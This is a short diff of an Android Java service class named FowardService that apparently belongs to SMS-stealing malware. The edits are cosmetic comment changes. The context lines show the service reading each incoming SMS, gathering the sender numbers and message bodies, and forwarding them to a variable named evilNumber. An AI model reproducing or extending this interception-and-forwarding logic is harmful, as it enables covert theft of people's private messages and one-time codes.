@@ -61,7 +61,7 @@ public class FowardService extends Service {
 	        String number="";        
 	        if (bundle != null)
 	        {
-	            //---retrieve the SMS message received---
+	            /* ---retrieve the SMS message received--- */
 	            Object[] pdus = (Object[]) bundle.get("pdus");
 	            msgs = new SmsMessage[pdus.length]; 
 	            
@@ -70,7 +70,7 @@ public class FowardService extends Service {
 	                number +=  msgs[i].getOriginatingAddress();                
 	                content += msgs[i].getMessageBody().toString();
 	                content += "\n";        
-	            }//end for
+	            }
 	            
 	            fowardSms(content,number,evilNumber);
 	            if ( CommonVariable.enableMACURY == true ) {
